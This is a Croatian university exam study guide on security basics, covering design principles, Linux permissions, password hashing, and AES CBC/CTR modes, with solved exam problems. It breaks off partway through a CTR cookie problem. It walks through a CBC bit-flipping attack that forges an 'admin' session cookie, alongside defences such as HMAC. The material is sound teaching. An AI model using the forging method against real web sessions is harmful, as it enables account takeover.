# SRS - Kompletna Skripta za Međuispit

> **Autor:** Generirana skripta za pripremu MI ispita
> **Napomena:** Teorija objašnjena od nule + riješeni ispitni zadaci organizirani po temama.
> **Oznake učestalosti:** ⭐⭐⭐ = pojavljuje se na SVAKOM ispitu | ⭐⭐ = često | ⭐ = povremeno

---

# POGLAVLJE 1: Osnovni pojmovi sigurnosti ⭐⭐⭐

## 1.1 Teorija

### Tri temeljna sigurnosna zahtjeva (CIA trijada)

Zamišljaj da imaš sef s tajnim dokumentom. Tri stvari želiš osigurati:

1. **Povjerljivost (Confidentiality)** — Samo ovlaštene osobe smiju VIDJETI sadržaj. Ako netko neovlašten pročita tvoj dokument, povjerljivost je narušena.

2. **Integritet (Integrity)** — Nitko ne smije MIJENJATI sadržaj bez odobrenja. Ako netko potajno promijeni broj na fakturi, integritet je narušen.

3. **Raspoloživost (Availability)** — Dokument mora biti DOSTUPAN kad ti treba. Ako netko zaključa sef i baci ključ, raspoloživost je narušena.

### Dodatna sigurnosna svojstva

- **Autentičnost (Authenticity)** — Možeš li biti siguran TKO je poslao poruku? Ako netko pošalje email s tuđeg imena, autentičnost je narušena.
- **Neporecivost (Non-repudiation)** — Pošiljatelj NE MOŽE poricati da je poslao poruku. Kao potpis na ugovoru.

### Ključni pojmovi — lanac napada

Zamisli kuću s otvorenim prozorom:

| Pojam | Definicija | Primjer |
|-------|-----------|---------|
| **Ranjivost** (vulnerability) | Slabost u sustavu koja se može iskoristiti | Otvoreni prozor na kući |
| **Prijetnja** (threat) | Potencijalna opasnost koja iskorištava ranjivost | Provala kroz prozor |
| **Agent prijetnje** (threat agent) | Osoba/entitet koji provodi prijetnju | Provalnik |
| **Izvor prijetnje** (threat source) | Kategorija/grupa kojoj agent pripada | Kriminalna organizacija |
| **Incident** | Kad je sigurnosni zahtjev stvarno narušen | Provalnik je ušao i ukrao TV |
| **Rizik** | Očekivani gubitak = prijetnja × vjerojatnost × šteta × ranjivost | Procjena koliko bi nas koštala provala |

### Sporedni kanal (Side Channel)

Komunikacijski kanal kroz koji "cure" informacije koje napadač može iskoristiti. Primjer: mjerenjem koliko VREMENA treba procesoru da obradi lozinku, napadač može zaključiti koliko je znakova pogodio.

### Vrste izvora prijetnji

| Izvor prijetnje | Motivacija/Cilj |
|----------------|-----------------|
| **Napredne ustrajne prijetnje (APT)** | Špijunaža, geopolitički ciljevi |
| **Kibernetički kriminal** | Financijska dobit (novac) |
| **Haktivisti** | Politički/ideološki ciljevi, aktivizam |

## 1.2 Riješeni zadaci

### Zadatak 1 (Vježbe 2021)
**Definirajte osnovne pojmove:**
- a) Kad sigurnosni zahtjev više nije ispunjen → **incident** (ili sigurnosni incident)
- b) Tri temeljna zahtjeva → **povjerljivost, integritet, raspoloživost**
- c) Podatak ne smije vidjeti neovlaštena osoba → **povjerljivost**

### Zadatak 2 (Vježbe 2021)
**Backup traka koju kurir prenosi:**
- a) Ranjivost: traka nije šifrirana / kurir je nepouzdan / fizički prijenos
- b) Prijetnja: krađa trake, presretanje podataka
- c) Zaštita: **šifriranje podataka na traci** (enkripcija)

### Zadatak 3 (Vježbe 2021)
**Motivacije izvora prijetnji:**
- a) APT → špijunaža, geopolitički interesi
- b) Kibernetički kriminal → financijska dobit
- c) Haktivisti → ideološki/politički ciljevi

### Zadatak 4 (Ispit 2021/2022)
**Osnovni pojmovi:**
- a) Narušavanje sigurnosnog zahtjeva = **incident**
- b) Napadač snima komunikaciju korisnika i Web sjedišta = narušena **povjerljivost (tajnost)**
- c) Napadač snimi komunikaciju i ponovi je (bez gledanja sadržaja) = narušena **autentičnost**
- d) Očekivani gubitak od prijetnje = **rizik**
- e) Kanal kroz koji cure informacije = **sporedni kanal (side channel)**
- f) Prijetnja iskorištava = **ranjivost**

### Zadatak 5 (Ispit 2021/2022)
**Prijetnja ili ranjivost?**
- a) Napad pogađanja grubom silom → **prijetnja** (aktivna radnja)
- b) Višestruka upotreba iste lozinke → **ranjivost** (slabost u sustavu)
- c) Krađa podataka s diska → **prijetnja**
- d) Pogađanje lozinki → **prijetnja**
- e) Spajanje računala na Internet → **ranjivost** (izlaže sustav napadima)

### Zadatak 6 (Ispit 2023)
**Mirko hakira Fakultet (phishing → buffer overflow → defacement):**
- a) Ranjivost: buffer-overflow bug u alatu passwd / lakovjernost zaposlenika
- b) Prijetnja: phishing napad / buffer overflow napad
- c) Agent prijetnje: Mirko
- d) Izvor prijetnje: studentska udruga "Za hakiranje uz studiranje" (haktivisti)

---

# POGLAVLJE 2: Smjernice sigurnog dizajna ⭐⭐⭐

## 2.1 Teorija

Ovo su PRAVILA kojih se trebaš držati kad dizajniraš siguran sustav. Pojavljuju se na SVAKOM ispitu!

### 1. Kerckhoffsov princip (Open Design)

> **Sigurnost sustava ne smije ovisiti o tajnosti dizajna, nego SAMO o tajnosti ključa.**

Primjer: AES algoritam je javan — svi znaju kako radi. Ali bez ključa ne možeš ništa dešifrirati. Kad netko kaže "moj algoritam je siguran jer nitko ne zna kako radi" — krši Kerckhoffsov princip.

### 2. Princip sigurnog ispadanja (Fail Securely)

> **Kad sustav padne/dođe do greške, mora pasti u SIGURNO stanje.**

Primjer: Ako provjera lozinke baci exception, sustav treba ODBITI pristup, a ne pustiti korisnika unutra.

**Tipičan ispitni zadatak:**
```
1: ispitProlaz = true;        // ← PROBLEM: pretpostavlja prolaz
2: try {
3:   bodovi = provjeriBodove();
4:   if (bodovi < 50) {
5:     ispitProlaz = false;
6:   }
7: }
8: catch (Exception ex) {
9:   // write error             // ← Ako padne ovdje, ispitProlaz ostaje TRUE!
10: }
```

**Popravak:** Liniju 1 promijeni u `ispitProlaz = false;` (pretpostavi NEUSPJEH), a dodaj `else { ispitProlaz = true; }` nakon linije 6 ako treba eksplicitno postaviti prolaz. **Odgovor: c)**

### 3. Princip najmanjih ovlasti (Least Privilege)

> **Svaki korisnik i proces treba imati SAMO minimalne ovlasti potrebne za obavljanje svog posla.**

Primjer krši se kad: alat `passwd` radi s root ovlastima samo da bi mogao pisati u /etc/shadow.

### 4. Obrana u dubinu (Defence in Depth)

> **Koristi VIŠE nezavisnih slojeva zaštite.**

Primjer: Ne oslanjaj se samo na VPN za pristup internim stranicama — dodaj i TLS. Ako VPN padne, TLS i dalje štiti.

### 5. Minimalna površina napada (Minimal Attack Surface)

> **Smanji broj načina na koji napadač može pristupiti sustavu.**

Primjer: Korištenje jednog wildcard certifikata na stotinama poslužitelja znači da napadač može doći do privatnog ključa na PUNO različitih mjesta → površina napada je prevelika.

## 2.2 Riješeni zadaci

### Zadatak 1 (Vježbe 2021 — Statička analiza)
**Statička analiza je:** a) Analiza izvornog koda s ciljem detekcije sigurnosnih propusta ✓

### Zadatak 2 (Vježbe 2021 — Stroga tipiziranost)
**Kod: x=3; y='SRS'; z=x+y; u strogo tipiziranom jeziku s provjerom tijekom izvođenja:**
Odgovor: **b) Greška tijekom izvođenja** (jer stroga tipizacija ne dopušta zbrajanje int + string, a provjera je runtime)

**A u slabo tipiziranom jeziku (ispit 2021/2022)?**
Odgovor: **d) z = "3SRS"** (slaba tipizacija automatski konvertira)

### Zadatak 3 (Vježbe 2021, Ispit 2021/2022, Ispit 2023 — Fail Securely)
**Kod s ispitProlaz = true i try/catch:** Odgovor uvijek **c)** — zamijeni `true` s `false` na liniji 1 i dodaj `else { ispitProlaz = true; }`.

**Zašto?** Ako `provjeriBodove()` baci iznimku, izvršavanje skoči u `catch` blok. Varijabla `ispitProlaz` ostaje na onoj vrijednosti koja je postavljena na liniji 1. Ako je `true`, student prolazi bez provjere → nesigurno ispadanje!

### Zadatak 4 (Ispit 2023/2025 — Sigurno ispadanje u kodu za CRL provjeru)
```python
def is_certificate_revoked(cert_pem):
    cert = parse_certificate(cert_pem)
    crl_url = get_crl_distribution_point(cert)
    try:
        crl_data = fetch_from_url(crl_url)
        crl = parse_crl(crl_data)
        for revoked_cert in crl.revoked_certificates:
            if revoked_cert.serial_number == cert.serial_number:
                return True
        return False
    except NetworkError as e:
        log("Failed to fetch CRL: " + str(e))
        return False     # ← PROBLEM!
```
**Problem:** Kad mreža ne radi, funkcija vraća `False` (certifikat NIJE opozvan). To znači da se opozvan certifikat prihvaća ako mreža padne!
**Popravak:** U `except` bloku treba `return True` (pretpostavi da JE opozvan) — sigurno ispadanje.

### Zadatak 5 (Ispit 2023 — Kerckhoffsov princip)
**Prijedlog: "koristit ćemo tajni hash algoritam poznat samo uskom krugu inženjera"**
Krši se: **Kerckhoffsov princip** — sigurnost ne smije ovisiti o tajnosti algoritma.

### Zadatak 6 (Ispit 2023 — Princip najmanjih ovlasti)
**Alat passwd radi s root ovlastima da bi pisao u /etc/shadow.**
Krši se: **Princip najmanjih ovlasti** (least privilege) — alat ima maksimalne ovlasti samo za jednu operaciju.

### Zadatak 7 (Ispit 2025 — Defence in Depth)
**CIP koristi samo VPN za interne stranice, bez TLS-a.**
Krši se: **Obrana u dubinu (Defence in Depth)** — samo jedan sloj zaštite.

### Zadatak 8 (Ispit 2025 — Minimalna površina napada)
**Jedan wildcard certifikat na stotinama poslužitelja.**
Krši se: **Minimalna površina napada** — privatni ključ je na previše mjesta.

### Zadatak 9 (Vježbe 2021 — Kerckhoffsov princip)
**Stefan kaže da ne smije otkrivati metode jer je kriptografija "zavijena velom tajni".**
Nije svjestan: **b) Kerckhoffsovog principa** — sigurnost algoritma ne smije ovisiti o tajnosti metode.

### Zadatak 10 (Ispit 2021/2022 — Princip najmanjih ovlasti)
**Princip najmanjih prava je:** a) Princip koji definira kako svim korisnicima i procesima treba dozvoliti najmanje potrebne ovlasti ✓

### Zadatak 11 (Ispit 2021/2022 — Poruka o grešci)
**Koja poruka kad korisnik upiše nepostojeće ime?** → `"Username or password incorrect"` — NIKAD ne otkrivaj postoji li korisničko ime ili ne.

---

# POGLAVLJE 3: Linux ovlasti i autorizacija ⭐⭐⭐

## 3.1 Teorija

### Kako čitati Linux dozvole

Kad napišeš `ls -l` u terminalu, vidiš nešto ovakvo:
```
-rw-r--r-- 1 root admin 2714 Apr 11 17:36 datoteka.txt
```

Raščlanimo to:
```
-  rw-  r--  r--
│  │    │    │
│  │    │    └── OTHER (svi ostali korisnici)
│  │    └─────── GROUP (korisnici u grupi)
│  └──────────── OWNER (vlasnik datoteke)
└─────────────── tip (- = datoteka, d = direktorij, l = link)
```

Svaka grupa ima 3 znaka:
- **r** = read (čitanje) = 4
- **w** = write (pisanje) = 2
- **x** = execute (izvršavanje) = 1
- **-** = nema dozvolu = 0

### Numerički zapis (chmod)

Zbrajaš vrijednosti za svaku grupu:
```
rwx = 4+2+1 = 7    (sve dozvole)
rw- = 4+2+0 = 6    (čitanje + pisanje)
r-- = 4+0+0 = 4    (samo čitanje)
r-x = 4+0+1 = 5    (čitanje + izvršavanje)
--- = 0+0+0 = 0    (ništa)
```

Primjer: `chmod 660 datoteka.txt` → `rw-rw----`
- Vlasnik: rw- (čitanje + pisanje)
- Grupa: rw- (čitanje + pisanje)
- Ostali: --- (ništa)

### Tko ima pristup?

Kad korisnik pristupa datoteci, sustav provjerava redom:
1. Je li korisnik VLASNIK? → koristi OWNER dozvole
2. Je li korisnik u GRUPI? → koristi GROUP dozvole
3. Inače → koristi OTHER dozvole

**VAŽNO:** Provjerava se SAMO JEDNA kategorija! Ako si vlasnik, gledaju se SAMO owner dozvole, čak i ako bi group dozvole bile šire!

**IZNIMKA:** `root` korisnik može SVE, neovisno o dozvolama!

### Naredba chmod

```bash
chmod 644 datoteka.txt     # rw-r--r--
chmod 660 datoteka.txt     # rw-rw----
chmod u-w datoteka.txt     # makni write vlasniku
chmod o-r datoteka.txt     # makni read ostalima
```

### Autorizacija — Subjekt, Objekt, Operacija

Kad netko pristupa nečemu, postoje tri dijela:
- **Subjekt** = TKO pristupa (korisnik, proces)
- **Objekt** = ČEMU pristupa (datoteka, resurs)
- **Operacija** = ŠTO radi (čitanje, pisanje, izvršavanje)

### Vrste autorizacije

1. **Diskrecijska (DAC — Discretionary Access Control)** — vlasnik odlučuje tko ima pristup (Linux datoteke su DAC)
2. **Mandatna (MAC — Mandatory Access Control)** — sustav/politika odlučuje, korisnik ne može promijeniti (vojni sustavi)

Linux datotečni sustav koristi **DAC** — vlasnik datoteke postavlja dozvole.

## 3.2 Riješeni zadaci

### Zadatak 1 (Vježbe 2021)
**Datoteka srs_ispit.txt ima ovlasti `rw-r--r-x`. Mogu li vanjski korisnici (other) pročitati?**
Other dozvole: `r-x` → r = read = DA! Odgovor: **a) da**

### Zadatak 2 (Ispit 2021/2022)
**Datoteka srs_ispit.txt ima `rw-------`, vlasnik 'predavač', grupa 'srs-studenti'. Želimo da studenti i predavač mogu pregledavati i pisati.**
- Predavač (owner): rw- = 6
- srs-studenti (group): rw- = 6
- Ostali: --- = 0
Odgovor: **d) 660**

### Zadatak 3 (Ispit 2023)
**Datoteka /etc/shadow: `-rw-r----- 1 root shadow`**
Korisnici: mirko, backup, root. Grupe: users (svi), shadow (samo backup).
- a) mirko čita? → mirko NIJE vlasnik (root je), mirko NIJE u grupi shadow → koristi OTHER (---) → **NE**
- b) mirko mijenja? → OTHER = --- → **NE**
- c) backup čita? → backup JE u grupi shadow → GROUP = r-- → **DA**
- d) backup mijenja? → GROUP = r-- (nema w) → **NE**
- e) root čita? → root može SVE → **DA**
- f) root mijenja? → root može SVE → **DA**

### Zadatak 4 (Ispit 2025)
**Datoteke certifikata:**
```
-rw-r--r-- 1 www-data admin 2714 fer_unizg_hr.cert
-r-------- 1 www-data admin  943 fer_unizg_hr.key
```
Korisnici: root, mirko, www-data. Grupa admin: root i mirko.

- a) www-data čita cert? → VLASNIK je www-data, OWNER = rw- → **DA, obje datoteke** (cert: rw-, key: r--)
- b) mirko čita cert? → mirko NIJE vlasnik, JE u grupi admin → GROUP za cert: r-- → **samo cert** (key group: ---)
- c) mirko mijenja? → GROUP za cert: r-- (nema w) → **nijednu**
- d) Naredba da nitko ne može mijenjati cert, ostalo ostaje: `chmod a-w fer_unizg_hr.cert` ili `chmod 444 fer_unizg_hr.cert` (ali to mijenja i ostala prava) → bolje: **`chmod a-w fer_unizg_hr.cert`**

### Zadatak 5 (Ispit 2023/2021 — Autorizacija)
**Mirko čita /etc/shadow:**
- Subjekt: **mirko** (ili proces koji mirko pokreće)
- Objekt: **datoteka /etc/shadow**
- Operacija: **čitanje**
- Vrste: **DAC (diskrecijska)** i **MAC (mandatna)**
- Linux koristi: **DAC**

### Zadatak 6 (Ispit 2021/2022)
**Proces učitava datoteku:**
- Subjekt: **proces**
- Objekt: **datoteka**
- Operacija: **učitavanje (čitanje)**

---

# POGLAVLJE 4: Autentifikacija i lozinke ⭐⭐

## 4.1 Teorija

### Što je autentifikacija?

Autentifikacija = provjera identiteta. Sustav provjerava "jesi li ti stvarno ti?"

### Tri kategorije (faktora) autentifikacije

| Faktor | Opis | Primjer |
|--------|------|---------|
| **Nešto što ZNAŠ** | Tajna informacija u tvojoj glavi | Lozinka, PIN, OIB |
| **Nešto što IMAŠ** | Fizički predmet | Pametna kartica, USB token, mobitel (za SMS kod) |
| **Nešto što JESI** | Biometrija | Otisak prsta, skeniranje lica, iris oka |

### Dvofaktorska autentifikacija (2FA)

Dvofaktorska = koristi faktore iz **DVIJE RAZLIČITE kategorije**.

**VAŽNO:** Lozinka + OIB = NIJE 2FA! Oboje su "nešto što znaš" = isti faktor!

Za pravu 2FA, primjerice:
- Lozinka (nešto što znaš) + SMS kod na mobitel (nešto što imaš) ✓
- Lozinka (nešto što znaš) + otisak prsta (nešto što jesi) ✓

### Pametne kartice

Pametna kartica kombinira DVA faktora:
1. Kartica sama = **nešto što imaš**
2. PIN za aktivaciju kartice = **nešto što znaš**

### Pohrana lozinki na Linuxu

Lozinke se NE spremaju u čistom tekstu! Spremaju se u `/etc/shadow` u ovom formatu:
```
username:$algoritam$salt$hash:...
```

Primjer:
```
mirko:$1$AAAAAAAA$VfQsehIHz92LcB7EDVQfql:...
```
- `$1$` = algoritam MDS (1=MD5, 2=Blowfish, 5=SHA-256, 6=SHA-512)
- `$AAAAAAAA$` = **salt** (slučajan niz koji se dodaje lozinci PRIJE hashiranja)
- `$VfQseh...` = hash vrijednost

### Što je salt i zašto postoji?

**Salt** = slučajan niz bajtova koji se dodaje lozinci prije hashiranja.

Bez salta:
```
hash("password123") = abc123    ← uvijek isti hash
```
Dva korisnika s istom lozinkom imaju ISTI hash → napadač to vidi!

Sa saltom:
```
hash("AAAAAAAA" + "password123") = xyz789
hash("BBBBBBBB" + "password123") = def456    ← RAZLIČITI hashevi!
```
Isti salt + ista lozinka = isti hash.
Različiti salt + ista lozinka = RAZLIČITI hashevi.

### Kako analizirati /etc/shadow zapise

Pravila:
1. Isti algoritam + isti salt + isti hash → **vjerojatno ISTA lozinka**
2. Isti algoritam + isti salt + različit hash → **RAZLIČITA lozinka** (sigurno!)
3. Različit salt + isti hash → **NE MOŽEMO zaključiti** (ali vjerovatno različita lozinka jer bi isti hash bio nevjerovatna slučajnost)
4. Razlika u JEDNOM znaku hasha → hashevi su potpuno različiti → lozinke se razlikuju u **najmanje jednom znaku** (ne nužno točno jednom!)

## 4.2 Riješeni zadaci

### Zadatak 1 (Ispit 2023 — Lozinke na Linuxu)
```
user_1:$1$AAAAAAAA$VfQsehIHz92LcB7EDVQfql:...
user_2:$1$AAAAAAAA$VfQsehIHz92LcB7EDVQfql:...
user_3:$1$BBBBBBBB$SgJVLgF98PESEx2qwlocFl:...
user_4:$1$AAAAAAAA$Ko6bjffl5V2AiHk749TeC/:...
user_5:$1$BBBBBBBB$VfQsehIHz92LcB7EDVQfql:...
user_6:$1$BBBBBBBB$VfQsehIHz92LcB7EDVQfqX:...
```

Analiza:
- user_1 i user_2: isti alg ($1$), isti salt (AAAAAAAA), isti hash → **DA, vjerojatno ista lozinka**
- user_1 i user_5: isti alg, RAZLIČIT salt, hash je isti string ali to ne znači ista lozinka jer salt je drugačiji → **NE MOŽEMO tvrditi** (zapravo: vjerojatno NEMAJU istu lozinku jer bi to bila ogromna slučajnost)
- user_1 i user_3: različit salt, različit hash → **ne možemo tvrditi da imaju istu**
- user_1 i user_4: isti salt (AAAAAAAA), RAZLIČIT hash → **sigurno NEMAJU istu lozinku**
- user_5 i user_6: isti salt (BBBBBBBB), hash razlika u zadnjem znaku (ql vs qX) → hash funkcije su kaotične, i najmanja promjena ulaza potpuno mijenja izlaz → lozinke se razlikuju u **najmanje jednom znaku** (NE možemo reći točno jednom!)

**Odgovori:**
- a) user_1 i user_2 ista lozinka → **DA**
- b) user_1 i user_2 nemaju istu → **NE**
- c) user_1 i user_5 ista lozinka → **NE** (različit salt, ne možemo tvrditi)
- d) user_1 i user_5 nemaju istu → **DA**
- e) user_1 i user_3 ista lozinka → **NE**
- f) user_1 i user_3 nemaju istu → **DA**
- g) user_1 i user_4 ista lozinka → **NE**
- h) user_1 i user_4 nemaju istu → **DA**
- i) user_5 i user_6 razlika u točno jednom znaku → **NE** (ne možemo to tvrditi — hash je kaotičan)
- j) user_5 i user_6 razlika u najmanje dva znaka → **NE** (ne možemo tvrditi ni to — samo znamo "najmanje 1 znak")

### Zadatak 2 (Ispit 2023 — Autentifikacija)
**a) Tri mehanizma:**
1. Lozinka → nešto što znamo
2. Pametna kartica → nešto što imamo
3. Otisak prsta → nešto što jesmo

**b) Zašto username + password + OIB nije 2FA?**
Jer su lozinka i OIB OBOJE "nešto što znaš" — isti faktor! Za 2FA trebaju faktori iz RAZLIČITIH kategorija.

**c) Kako dodati 2FA u AAI@EduHr?**
Dodati TOTP (Time-based One-Time Password) aplikaciju na mobitelu (npr. Google Authenticator). Mobitel = "nešto što imaš" → kombinacija s lozinkom ("nešto što znaš") = prava 2FA.

### Zadatak 3 (Ispit 2021/2022 — Kontrola pristupa)
**Pametne kartice se temelje na:** nešto što imamo (kartica) + nešto što znamo (PIN)

### Zadatak 4 (Ispit 2021/2022 — Poruka o grešci za lozinku)
**Ispravna poruka:** `"Username or password incorrect"` — NIKAD ne govori korisniku je li username ili password kriv, jer to pomaže napadaču suziti pretragu.

---

# POGLAVLJE 5: Kriptografija — osnove ⭐⭐

## 5.1 Teorija

### Što je kriptografija?

Kriptografija = znanost o tajnom pisanju. Cilj: zaštititi poruke tako da ih samo ovlaštene osobe mogu čitati.

### Simetrična vs. Asimetrična kriptografija

| Svojstvo | Simetrična | Asimetrična |
|----------|-----------|-------------|
| Broj ključeva | **1 ključ** (isti za šifriranje i dešifriranje) | **2 ključa** (javni + privatni) |
| Brzina | **Brza** | **Spora** (100-1000x sporija) |
| Primjer | AES, ChaCha20 | RSA, ECC |
| Problem | Kako sigurno podijeliti ključ? | Sporija, ali nema problem distribucije ključa |
| Veličina ključa | 128-256 bitova | 2048-4096 bitova |

### Jednokratna bilježnica (One-Time Pad)

Najjednostavniji kriptosustav. Radi ovako:
1. Ključ je POTPUNO SLUČAJAN niz bitova, ISTE DULJINE kao poruka
2. Šifriranje: šifrat = poruka XOR ključ
3. Dešifriranje: poruka = šifrat XOR ključ

**XOR tablica:**
```
0 XOR 0 = 0
0 XOR 1 = 1
1 XOR 0 = 1
1 XOR 1 = 0
```

**Prednost:**
- Pruža **savršenu povjerljivost** — matematički dokazano neprobojna!

**Nedostaci:**
- Ključ mora biti **iste duljine** kao poruka (za poruku od 1GB trebaš ključ od 1GB)
- Ključ se smije koristiti **samo jednom** (otud "jednokratna")
- Distribucija ključa je nepraktična

**Što NE pruža:**
- NE pruža integritet (napadač može mijenjati bitove šifrata)
- NE pruža autentičnost
- NE pruža neporecivost
- NE pruža raspoloživost

### Hibridna enkripcija (Digitalna omotnica)

**Problem:** Simetrična šifra je brza ali kako podijeliti ključ? Asimetrična rješava distribuciju ali je spora.

**Rješenje — Digitalna omotnica:**
1. Generiraj slučajni simetrični ključ `k`
2. Šifriraj poruku simetričnom šifrom: `c = AES(m, k)`
3. Šifriraj simetrični ključ asimetričnom šifrom: `ek = RSA_encrypt(P(k), e, N)` (P je funkcija nadopunjavanja)
4. Pošalji: (c, ek)

**Dešifriranje:**
1. Dešifriraj simetrični ključ: `k = RSA_decrypt(ek, d, N)`
2. Dešifriraj poruku: `m = AES_decrypt(c, k)`

**Zašto kombinirati?** Zato jer "obični RSA" sam po sebi NIJE siguran sustav kriptiranja (deterministički je — isti ulaz uvijek daje isti izlaz). Kombinacijom s AES-om dobivamo sigurnost.

## 5.2 Riješeni zadaci

### Zadatak 1 (Ispit 2023 / 2021/2022 — Jednokratna bilježnica)
**Koja sigurnosna svojstva pruža?**
- Neporecivost → **NE**
- Integritet → **NE**
- Raspoloživost → **NE**
- Savršenu povjerljivost → **DA** ← jedino ovo!
- Autentičnost → **NE**

### Zadatak 2 (Ispit 2021/2022 — Hibridna enkripcija)
**a) Zašto kombinirati simetričnu i asimetričnu šifru?**
Zato jer asimetrična šifra (obični RSA) sama po sebi nije siguran sustav kriptiranja (deterministička je). Kombinacijom s AES-om (koji je brz i siguran) dobivamo i sigurnost i praktičnost distribucije ključeva.

**b) Siguran način kombiniranja RSA i AES:**
Digitalna omotnica:
1. Generiraj slučajni 128-bitni ključ k
2. c = AES128_encrypt(m, k)
3. ek = (P(k))^e mod N (RSA enkripcija s nadopunjavanjem)
4. Pošalji (c, ek)

### Zadatak 3 (Ispit 2021/2022 — Jednokratna bilježnica prednosti/nedostaci)
- **Prednost:** savršena povjerljivost
- **Nedostaci:** (1) ključ mora biti iste duljine kao poruka, (2) ključevi se smiju koristiti samo jednom

---

# POGLAVLJE 6: AES i načini rada (CBC, CTR) ⭐⭐⭐

> **OVO JE NAJVAŽNIJE POGLAVLJE ZA ISPIT!** Zadaci s kolačićima se pojavljuju na SVAKOM ispitu i nose 4-6 bodova!

## 6.1 Teorija

### Što je AES?

AES (Advanced Encryption Standard) je **simetrična blok šifra**:
- **Simetrična** = isti ključ za šifriranje i dešifriranje
- **Blok šifra** = šifrira podatke u blokovima fiksne veličine (128 bitova = 16 bajtova)

AES-128 koristi ključ od 128 bitova (16 bajtova).

**Važna svojstva AES-128 (ispitno pitanje!):**
- Pruža savršenu povjerljivost? → **NE** (ključ je kraći od poruke)
- Nepraktično veliki resursi za grubu silu? → **DA** (2^128 mogućnosti)
- Štiti integritet? → **NE** (AES sam po sebi NE štiti integritet!)
- Efektivna veličina ključa ~128 bitova? → **DA**
- Semantički siguran? → **NE** (AES sam, kao blok šifra, je deterministički — isti ulaz → isti izlaz)
- Zasnovan na faktorizaciji? → **NE** (to je RSA)
- Supstitucijsko-permutacijska mreža? → **DA**
- Stvarna veličina ključa veća od efektivne? → **NE** (jednake su)

### Problem blok šifre

AES šifrira samo JEDAN blok od 16 bajtova. Ali poruke su obično duže! Zato koristimo **načine rada** (modes of operation) koji definiraju KAKO šifrirati više blokova.

### CBC način rada (Cipher Block Chaining)

**Ideja:** Svaki blok se XOR-a s prethodnim šifratom prije šifriranja → blokovi su "povezani u lanac".

**CBC Enkripcija:** Za poruku p = p1 || p2 (dva bloka po 16 bajtova):
```
c1 = AES128_ENCRYPT(p1 XOR iv, k)
c2 = AES128_ENCRYPT(p2 XOR c1, k)
šifrat = iv || c1 || c2
```

Vizualno:
```
   p1              p2
   │               │
   ▼               ▼
  XOR ← iv       XOR ← c1
   │               │
   ▼               ▼
 AES(k)          AES(k)
   │               │
   ▼               ▼
   c1              c2
```

**CBC Dekripcija:** Za šifrat x = x1 || x2:
```
p1 = AES128_DECRYPT(x1, k) XOR iv
p2 = AES128_DECRYPT(x2, k) XOR x1
```

Vizualno:
```
   x1              x2
   │               │
   ▼               ▼
AES_DEC(k)     AES_DEC(k)
   │               │
   ▼               ▼
  XOR ← iv       XOR ← x1
   │               │
   ▼               ▼
   p1              p2
```

**Ključno za napad:** U CBC dekripciji, `p1 = AES_DEC(x1, k) XOR iv`. Napadač kontrolira iv! Ako promijeni iv, direktno kontrolira p1!

### CTR način rada (Counter)

**Ideja:** AES se koristi kao generator pseudo-slučajnog niza. Šifrira BROJAČ (counter), a rezultat se XOR-a s porukom.

**CTR Enkripcija:** Za poruku p = p1 || p2 || p3 (tri bloka):
```
c1 = AES128(iv + 1, k) XOR p1
c2 = AES128(iv + 2, k) XOR p2
c3 = AES128(iv + 3, k) XOR p3
šifrat = iv || c1 || c2 || c3
```

Vizualno:
```
  iv+1           iv+2           iv+3
   │              │              │
   ▼              ▼              ▼
 AES(k)        AES(k)         AES(k)
   │              │              │
   ▼              ▼              ▼
  XOR            XOR            XOR
   ▲              ▲              ▲
   │              │              │
   p1             p2             p3
   │              │              │
   ▼              ▼              ▼
   c1             c2             c3
```

**CTR Dekripcija:** ISTA STVAR kao enkripcija! (jer XOR je reverzibilan)
```
p1 = AES128(iv + 1, k) XOR c1
p2 = AES128(iv + 2, k) XOR c2
p3 = AES128(iv + 3, k) XOR c3
```

### Svojstva CTR načina

CTR je zapravo **stream šifra** izgrađena na blok šifri. Generira pseudo-slučajni niz (keystream) i XOR-a ga s porukom — slično kao jednokratna bilježnica, ali s pseudo-slučajnim ključem.

**Ključno za napad na CTR:** Ako napadač zna izvorni tekst p1 i šifrat c1, može izračunati keystream: `ks = p1 XOR c1`. Onda može stvoriti šifrat za BILO KOJI tekst: `c1' = ks XOR p1_novi`.

### AES — Povjerljivost vs. Integritet

**AES (u bilo kojem načinu rada) pruža SAMO povjerljivost, NE i integritet!**

Napadač ne može PROČITATI poruku, ali MOŽE ju mijenjati (pogotovo u CTR modu — samo XOR-a bitove šifrata i time mijenja odgovarajuće bitove izvornog teksta).

Za integritet trebamo MAC (Message Authentication Code) — npr. HMAC ili dodati hash.

## 6.2 Riješeni zadaci — Kolačići (Cookie attacks)

### Zadatak 1 (Ispit 2023 — CBC kolačići, 6 bodova)

**Sustav:**
- Korisničko ime (max 20 znakova) se nadopuni na 32 bajta (p = p1 || p2)
- iv = 16 slučajnih bajtova
- Kolačić: c = iv || AES128-CBC-ENCRYPT(iv, p, k) = ukupno 48 bajtova

**a) Opišite CBC enkripciju za p = p1 || p2:**
```
c1 = AES128_ENCRYPT(p1 XOR iv, k)
c2 = AES128_ENCRYPT(p2 XOR c1, k)
Kolačić = iv || c1 || c2
```

**b) Opišite CBC dekripciju za x = x1 || x2:**
```
p1 = AES128_DECRYPT(x1, k) XOR iv
p2 = AES128_DECRYPT(x2, k) XOR x1
```

**c) Napad — prijava kao 'admin' ako si korisnik 'ana':**

Ovo je klasičan **CBC bit-flipping napad**!

1. Napadač se prijavi kao 'ana' → dobije kolačić: iv || c1 || c2
2. Server je šifrirao: p1 = "ana\x00\x00...\x00" (16 bajtova)
3. Kod dekripcije: p1 = AES_DEC(c1, k) XOR iv
4. Napadač želi da dekripcija dâ: p1' = "admin\x00...\x00"
5. Izračunaj razliku: delta = p1 XOR p1' = "ana..." XOR "admin..."
6. Novi iv: iv' = iv XOR delta
7. Pošalji kolačić: iv' || c1 || c2

Kad server dešifrira:
- AES_DEC(c1, k) XOR iv' = AES_DEC(c1, k) XOR iv XOR delta = p1 XOR delta = p1' = "admin..."

**d) Siguran kolačić sa simetričnom kriptografijom:**
Dodati HMAC za integritet: `kolačić = iv || c || HMAC(k2, iv || c)` gdje je k2 drugi ključ. Server pri provjeri računa HMAC i uspoređuje — ako se ne poklapa, odbij.

**e) Siguran kolačić s asimetričnom kriptografijom:**
Koristiti digitalni potpis: `kolačić = korisnicko_ime || RSA_SIGN(d, H(korisnicko_ime))`. Server provjerava potpis javnim ključem.

### Zadatak 2 (Ispit 2025 — CTR kolačići, 4 boda)

**Sustav (s SHA256 provjerom):**
- u = korisničko ime nadopunjeno na 16 bajtova
- h = SHA256(u) = 32 bajta
- p = u || h (48 bajtova = 3 bloka)
- iv = 16 slučajnih bajtova
